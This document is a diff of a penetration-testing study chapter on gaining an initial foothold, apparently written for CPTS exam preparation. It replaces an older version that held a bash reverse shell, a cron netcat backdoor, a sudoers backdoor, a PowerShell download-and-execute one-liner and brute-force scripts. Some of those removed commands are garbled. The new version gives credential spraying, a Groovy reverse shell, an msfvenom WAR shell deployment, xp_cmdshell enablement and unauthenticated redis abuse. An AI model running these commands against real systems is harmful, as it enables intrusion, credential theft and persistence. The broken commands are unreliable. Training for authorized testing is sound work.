@@ -1,126 +1,116 @@
-# 04- Foothold: Initial Access Operations
+# Initial Foothold
 
-Gain persistent access by exploiting service misconfigurations, stale credentials, and default passwords.
+**Turning "open port" into "shell on the box."** After enumeration you have services + versions. The foothold comes from one of five paths: a public exploit, default/weak creds, a web vuln, an exposed admin/deploy interface, or a leaked credential. Work them in that rough order of speed.
 
-### Attack Workflow
-1. **Port & Service Enumeration**: Identify services running, their versions, and exposed paths.
-2. **Fingerprint Parsing**: Use Banner Grabbing to identify specific software versions with known vulnerabilities.
-3. **Credential Harvesting**: Exploit web-based forms, API endpoints, or database backdoors.
-4. **Exploitation**: Execute Remote Code Execution (RCE) or escalate privileges.
-5. **Persistence**: Install shellback or set up cron jobs to maintain access to `{target}`.
+> Before exploiting, ask: *what does this version get me?* `searchsploit <service> <version>` first — a public RCE is faster than brute force.
 
-### Commands Section
+---
 
-#### Service Enumeration
+## Path 1 — Public Exploit for a Known Version
+
 ```bash
-# Comprehensive open ports and services
-nmap -sC -sV -p- {target}
-
-# Parse service banners for version clues
-for port in $(nmap -sV {target} | grep open | awk '{print $3}'); do
-  curl -s --max-time 5 --data-urlencode "$port:$port" {target} | head -1
-done
+searchsploit apache 2.4.49
+searchsploit -m 50383            # copy an exploit locally
+# Also check nuclei / metasploit
+nuclei -u http://{target} -severity critical,high
+msfconsole -q -x "search <product>"
 ```
+Read the exploit before running it. Adjust `LHOST`, `LPORT`, target URL, and offsets. If it's a metasploit module, `set RHOSTS {target}` / `set LHOST tun0`.
 
-#### Credential Attacks
+---
+
+## Path 2 — Default & Weak Credentials
+
+Try the obvious first — it wins more boxes than people admit.
 ```bash
-# Web-based login enumeration (Fuzzing common user/pass patterns)
-python3 -c "
-import requests
-import string
-users = ['admin', 'root', 'administrator', 'guest']
-passwords = ['123456', 'admin', 'password', 'qwerty', 'default']
-for u in users:
-  for p in passwords:
-    r = requests.post(f'{target}/login', data={'username': u, 'password': p})
-    if r.status_code in [200, 302]:
-      print(f'*** Found: {u}:{p} ***')
-"
-```
+# Service logins (see Password Attacks chapter for full hydra/netexec syntax)
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4
+nxc smb {target} -u users.txt -p passwords.txt --continue-on-success
+nxc winrm {target} -u admin -p admin
 
-#### Web Vulnerability Exploitation
+# Common default creds to try by hand:
+#   admin:admin  root:root  admin:password  tomcat:tomcat  postgres:postgres
+#   sa:(blank)   guest:(blank)   jenkins:jenkins   grafana admin:admin
+```
+Search default creds for the exact product (`searchsploit <product> default`, vendor docs, or the DefaultCreds-cheat-sheet).
+
+---
+
+## Path 3 — Web Application Vulnerability
+
+The most common CPTS foothold. Full workflow + payloads in the **Web Attacks** and **Payloads** chapters. Fast checklist:
 ```bash
-# Enumerate admin panels using directory crawler
-ffu -w /path/to/wordlist.txt -u "http://{target}/" -r 10 -v
-
-# Exploit SQL Injection via UNION SELECT
-curl "http://{target}/search?id=1 UNION SELECT username,password FROM users--" -X POST
+# 1) Identify + discover
+whatweb -a3 http://{target}; gobuster dir -u http://{target} -w .../directory-list-2.3-medium.txt -x php,txt,bak
+# 2) Exploit the class you find:
+#    SQLi -> sqlmap --os-shell    |    upload -> web shell    |    LFI -> log poisoning
+#    SSTI -> RCE payload          |    command inj -> reverse shell
+# 3) Land a reverse shell (start listener first!)
 ```
+Upload/deploy interfaces are gold: **Tomcat manager** (deploy WAR), **Jenkins** (Groovy script console), **phpMyAdmin** (`SELECT ... INTO OUTFILE`), **Gitlab/Grafana** (CVE-driven).
 
-#### RCE Payload Delivery
 ```bash
-# PHP Reverse Shell using nc (Linux)
-php -r "$cmd=shell_exec('cat /etc/passwd'); $c=exec('cat /dev/tcp/{target}/8080 0>&1'); $r=exec('cat /dev/tcp/{target}/8080 2>&1'); echo $r; exec($cmd); exec($c); exec($r);" > /tmp/rce.php
-curl -X POST --data-binary "@/tmp/rce.php" http://{target}/upload.php
+# Jenkins Script Console -> instant RCE (Manage Jenkins > Script Console):
+# Groovy:
+String host="{target}";int port=4444;String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);/* ... classic groovy rev shell ... */
 
-# Bash Reverse Shell (Linux)
-bash -i >& /dev/tcp/{target}/4444 0>&1
+# Tomcat manager WAR deploy:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST={target} LPORT=4444 -f war -o sh.war
+curl -u tomcat:s3cret -T sh.war "http://{target}:8080/manager/text/deploy?path=/sh"
+curl "http://{target}:8080/sh/"     # trigger it
 ```
 
-#### Persistence Setup
+---
+
+## Path 4 — Exposed Service / File Share
+
 ```bash
-# Add user to sudoers via backdoor script
-echo '{target}/backdoor.sh ALL=(ALL) NOPASSWD:ALL' >> {target}/etc/sudoers.d/backdoor
+# Anonymous FTP / writable share -> drop a payload where the web server executes it
+ftp {target}      # anonymous
+smbclient -N //{target}/share
+# NFS export -> mount and read/write
+showmount -e {target}; sudo mount -t nfs {target}:/export /mnt
 
-# Install cron job to execute backdoor
-crontab -e
-# Add: 0 * * * * /usr/bin/nc -e /bin/bash 127.0.0.1 4444 > /dev/null 2>&1
+# Databases exposed to the network
+mysql -h {target} -u root                     # blank/weak root
+impacket-mssqlclient sa:'Password1'@{target}  # then enable xp_cmdshell
+redis-cli -h {target}                         # unauth redis -> write SSH key / web shell
 ```
 
-### Tips & Shortcuts
-- **Bash**: `nmap -sC -sV` auto-discovers exploits; `nmap --script` runs NSE.
-- **Python**: `requests.post` is faster than `curl` for complex payloads.
-- **Windows**: Use `powershell -c "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('{target}/payload.ps1')"`.
-- **Reverse vs Bind**: Use reverse shells to maintain control without exposing your machine to egress filters.
-
-### Common Mistakes
-- **Scanning too broadly**: Focus only on high-risk ports (21, 22, 23, 80, 443, 3306, 1433).
-- **Ignoring version info**: Default passwords often depend on specific software versions.
-- **Forgetting persistence**: A one-time access is useless without re-access capability.
-- **Missing lateral movement**: Once inside `{target}`, try to move to domain controllers.
-
-### Mini Automation Scripts
-
-#### Python: Credential Brute-forcer with Web Check
-```python
-#!/usr/bin/env python3
-import requests
-import itertools
-from concurrent.futures import ThreadPoolExecutor
-
-target = "{target}"
-users = ['admin', 'root', 'administrator', 'guest', 'nagios']
-passwords = ['123456', 'admin', 'password', 'root', 'default', 'nagios']
-
-def check_cred(u, p):
-    r = requests.post(f'{target}/login', json={'username': u, 'password': p}, allow_redirects=False)
-    if r.status_code == 200 and 'login' not in r.text.lower():
-        return f'ACCESS: {u}:{p}'
-    return None
-
-for u, p in itertools.product(users, passwords):
-    res = check_cred(u, p)
-    if res:
-        print(res)
-        break
+MSSQL → RCE via `xp_cmdshell`:
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
 ```
 
-#### Bash: Directory Fuzzer with Timeout
+---
+
+## Path 5 — Leaked / Reused Credentials
+
+Creds you found earlier (web config, git repo, SMB share, `.bash_history`) almost always unlock something else.
 ```bash
-#!/bin/bash
-DOMAIN="${target}"
-WORDLIST="/path/to/dirwordlist.txt"
-MAX_RETRIES=10
-
-# Use gobuster to find web directories
-echo "[*] Starting directory enumeration..."
-gobuster d -u "http://$DOMAIN" -w "$WORDLIST" -t 10 -e
-
-# If specific subdomain exists, test for vulnerabilities
-if [ -z "$DIR" ]; then
-    echo "[!] No directories found, stopping."
-else
-    echo "[+] Found directory: $DIR"
-    ffu -w "$WORDLIST" -u "http://$DOMAIN$DIR/" -t 5
-fi
+# Spray a found password across every service and host
+nxc smb {target} -u found_user -p 'FoundPass!'
+nxc ssh {target} -u found_user -p 'FoundPass!'
+evil-winrm -i {target} -u found_user -p 'FoundPass!'
 ```
+
+---
+
+## After You Get the Shell
+
+1. **Upgrade to a TTY immediately** (Payloads chapter). A dumb shell dies on `su`/`ssh` and Ctrl-C kills it.
+2. **Stabilise & orient:** `id` / `whoami /all`, `hostname`, `ip a`, `sudo -l` (Linux) / `whoami /priv` (Windows).
+3. **Grab low-hanging creds** and enumerate for privesc (chapters 06/07).
+4. **Note the callback** (LHOST/LPORT) and how you got in — you'll need it for the report.
+
+## Common Mistakes
+
+- **Brute-forcing before checking `searchsploit`.** A public RCE for the exact version is faster and cleaner.
+- **Skipping default creds.** `admin:admin` / `tomcat:tomcat` open a surprising number of doors.
+- **Firing an exploit without reading it.** Wrong LHOST/offset = crash or no callback; some "exploits" are traps.
+- **Not upgrading the shell.** Half your commands fail in a dumb shell — fix the TTY first.
+- **Ignoring reused creds.** The DB password from a web config is very often an SSH/WinRM password too.
